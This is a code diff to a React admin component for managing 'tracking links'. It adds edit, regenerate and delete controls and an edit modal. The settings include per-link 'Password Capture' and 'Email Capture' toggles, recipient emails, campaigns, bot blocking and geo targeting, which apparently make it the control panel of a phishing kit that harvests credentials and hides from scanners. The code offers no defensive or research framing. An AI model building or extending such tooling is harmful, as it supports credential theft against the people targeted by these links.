@@ -1,11 +1,13 @@
 import React, { useState, useEffect } from 'react';
-import { Plus, Copy, Eye, Trash2, Settings, Globe, Shield, Filter, Search, Download, MousePointerClick, Users, Bot } from 'lucide-react';
+import { Plus, Copy, Eye, Trash2, Settings, Globe, Shield, Filter, Search, Download, MousePointerClick, Users, Bot, Edit, RefreshCw } from 'lucide-react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 
 const TrackingLinks = () => {
   const [links, setLinks] = useState([]);
   const [campaigns, setCampaigns] = useState([]);
   const [showCreateForm, setShowCreateForm] = useState(false);
+  const [showEditForm, setShowEditForm] = useState(false);
+  const [editingLink, setEditingLink] = useState(null);
   const [searchTerm, setSearchTerm] = useState('');
   const [selectedCampaign, setSelectedCampaign] = useState('');
   const [linkStats, setLinkStats] = useState({
@@ -169,6 +171,116 @@ const TrackingLinks = () => {
   const copyToClipboard = (text, type) => {
     navigator.clipboard.writeText(text);
     alert(`${type} copied to clipboard!`);
+  };
+
+  const editLink = (link) => {
+    setEditingLink(link);
+    setFormData({
+      target_url: link.target_url,
+      campaign_id: link.campaign_id || '',
+      recipient_email: link.recipient_email || '',
+      capture_email: link.capture_email,
+      capture_password: link.capture_password,
+      bot_blocking_enabled: link.bot_blocking_enabled,
+      rate_limiting_enabled: link.rate_limiting_enabled,
+      dynamic_signature_enabled: link.dynamic_signature_enabled || false,
+      mx_verification_enabled: link.mx_verification_enabled || false,
+      geo_targeting_enabled: link.geo_targeting_enabled,
+      geo_filter_mode: 'allow',
+      allowed_countries: link.allowed_countries ? link.allowed_countries.join(', ') : '',
+      blocked_countries: link.blocked_countries ? link.blocked_countries.join(', ') : '',
+      allowed_cities: link.allowed_cities ? link.allowed_cities.join(', ') : '',
+      blocked_cities: link.blocked_cities ? link.blocked_cities.join(', ') : '',
+      custom_preview_enabled: false,
+      preview_template_url: ''
+    });
+    setShowEditForm(true);
+  };
+
+  const handleEditLink = async (e) => {
+    e.preventDefault();
+    
+    if (!editingLink) return;
+
+    const processedData = {
+      ...formData,
+      allowed_countries: formData.geo_filter_mode === 'allow' && formData.allowed_countries ? 
+        formData.allowed_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
+      blocked_countries: formData.geo_filter_mode === 'block' && formData.blocked_countries ? 
+        formData.blocked_countries.split(',').map(c => c.trim().toUpperCase()).filter(c => c) : [],
+      allowed_cities: formData.geo_filter_mode === 'allow' && formData.allowed_cities ? 
+        formData.allowed_cities.split(',').map(c => c.trim()).filter(c => c) : [],
+      blocked_cities: formData.geo_filter_mode === 'block' && formData.blocked_cities ? 
+        formData.blocked_cities.split(',').map(c => c.trim()).filter(c => c) : []
+    };
+
+    try {
+      const response = await fetch(`/api/links/${editingLink.id}`, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(processedData),
+      });
+
+      if (response.ok) {
+        setShowEditForm(false);
+        setEditingLink(null);
+        setFormData({
+          target_url: '',
+          campaign_id: '',
+          recipient_email: '',
+          capture_email: false,
+          capture_password: false,
+          bot_blocking_enabled: true,
+          rate_limiting_enabled: false,
+          dynamic_signature_enabled: false,
+          mx_verification_enabled: false,
+          geo_targeting_enabled: false,
+          geo_filter_mode: 'allow',
+          allowed_countries: '',
+          blocked_countries: '',
+          allowed_cities: '',
+          blocked_cities: '',
+          custom_preview_enabled: false,
+          preview_template_url: ''
+        });
+        fetchLinks();
+        alert('Link updated successfully!');
+      } else {
+        const error = await response.json();
+        alert(`Error: ${error.error}`);
+      }
+    } catch (error) {
+      console.error('Error updating link:', error);
+      alert('Failed to update link');
+    }
+  };
+
+  const regenerateLink = async (linkId) => {
+    if (!confirm('Are you sure you want to regenerate this link? The old URL will no longer work.')) {
+      return;
+    }
+
+    try {
+      const response = await fetch(`/api/links/${linkId}/regenerate`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      if (response.ok) {
+        fetchLinks();
+        alert('Link regenerated successfully!');
+      } else {
+        const error = await response.json();
+        alert(`Error: ${error.error}`);
+      }
+    } catch (error) {
+      console.error('Error regenerating link:', error);
+      alert('Failed to regenerate link');
+    }
   };
 
   const deleteLink = async (linkId) => {
@@ -385,8 +497,23 @@ const TrackingLinks = () => {
               {/* Actions */}
               <div className="flex gap-2">
                 <button
+                  onClick={() => editLink(link)}
+                  className="p-2 text-blue-400 hover:text-blue-300 hover:bg-blue-900/20 rounded transition-colors"
+                  title="Edit Link"
+                >
+                  <Edit className="w-4 h-4" />
+                </button>
+                <button
+                  onClick={() => regenerateLink(link.id)}
+                  className="p-2 text-green-400 hover:text-green-300 hover:bg-green-900/20 rounded transition-colors"
+                  title="Regenerate Link"
+                >
+                  <RefreshCw className="w-4 h-4" />
+                </button>
+                <button
                   onClick={() => deleteLink(link.id)}
                   className="p-2 text-red-400 hover:text-red-300 hover:bg-red-900/20 rounded transition-colors"
+                  title="Delete Link"
                 >
                   <Trash2 className="w-4 h-4" />
                 </button>
@@ -650,6 +777,137 @@ const TrackingLinks = () => {
                   className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                 >
                   Create Link
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {/* Edit Link Modal */}
+      {showEditForm && editingLink && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+          <div className="bg-gray-800 rounded-lg p-6 w-full max-w-2xl max-h-[90vh] overflow-y-auto">
+            <div className="flex justify-between items-center mb-6">
+              <h3 className="text-xl font-bold text-white">Edit Tracking Link</h3>
+              <button
+                onClick={() => {
+                  setShowEditForm(false);
+                  setEditingLink(null);
+                }}
+                className="text-gray-400 hover:text-white"
+              >
+                ×
+              </button>
+            </div>
+
+            <form onSubmit={handleEditLink} className="space-y-6">
+              {/* Basic Settings */}
+              <div className="space-y-4">
+                <h4 className="text-lg font-semibold text-white">Basic Settings</h4>
+                <div>
+                  <label className="block text-sm font-medium text-gray-300 mb-2">Target URL *</label>
+                  <input
+                    type="url"
+                    required
+                    value={formData.target_url}
+                    onChange={(e) => setFormData({...formData, target_url: e.target.value})}
+                    placeholder="https://example.com"
+                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-300 mb-2">Campaign</label>
+                  <select
+                    value={formData.campaign_id}
+                    onChange={(e) => setFormData({...formData, campaign_id: e.target.value})}
+                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  >
+                    <option value="">No Campaign</option>
+                    {campaigns.map(campaign => (
+                      <option key={campaign.id} value={campaign.id}>{campaign.name}</option>
+                    ))}
+                  </select>
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-300 mb-2">Recipient Email (Optional)</label>
+                  <input
+                    type="email"
+                    value={formData.recipient_email}
+                    onChange={(e) => setFormData({...formData, recipient_email: e.target.value})}
+                    placeholder="recipient@example.com"
+                    className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  />
+                </div>
+              </div>
+
+              {/* Security Features */}
+              <div className="space-y-4">
+                <h4 className="text-lg font-semibold text-white">Security Features</h4>
+                
+                <div className="flex items-center justify-between">
+                  <label htmlFor="edit_capture_email" className="text-gray-300">Email Capture</label>
+                  <input
+                    type="checkbox"
+                    id="edit_capture_email"
+                    checked={formData.capture_email}
+                    onChange={(e) => setFormData({...formData, capture_email: e.target.checked})}
+                    className="form-checkbox h-5 w-5 text-blue-600"
+                  />
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <label htmlFor="edit_capture_password" className="text-gray-300">Password Capture</label>
+                  <input
+                    type="checkbox"
+                    id="edit_capture_password"
+                    checked={formData.capture_password}
+                    onChange={(e) => setFormData({...formData, capture_password: e.target.checked})}
+                    className="form-checkbox h-5 w-5 text-blue-600"
+                  />
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <label htmlFor="edit_bot_blocking_enabled" className="text-gray-300">Bot Blocking</label>
+                  <input
+                    type="checkbox"
+                    id="edit_bot_blocking_enabled"
+                    checked={formData.bot_blocking_enabled}
+                    onChange={(e) => setFormData({...formData, bot_blocking_enabled: e.target.checked})}
+                    className="form-checkbox h-5 w-5 text-blue-600"
+                  />
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <label htmlFor="edit_geo_targeting_enabled" className="text-gray-300">Geo Targeting</label>
+                  <input
+                    type="checkbox"
+                    id="edit_geo_targeting_enabled"
+                    checked={formData.geo_targeting_enabled}
+                    onChange={(e) => setFormData({...formData, geo_targeting_enabled: e.target.checked})}
+                    className="form-checkbox h-5 w-5 text-blue-600"
+                  />
+                </div>
+              </div>
+
+              <div className="flex justify-end gap-4">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowEditForm(false);
+                    setEditingLink(null);
+                  }}
+                  className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
+                >
+                  Cancel
+                </button>
+                <button
+                  type="submit"
+                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
+                >
+                  Update Link
                 </button>
               </div>
             </form>
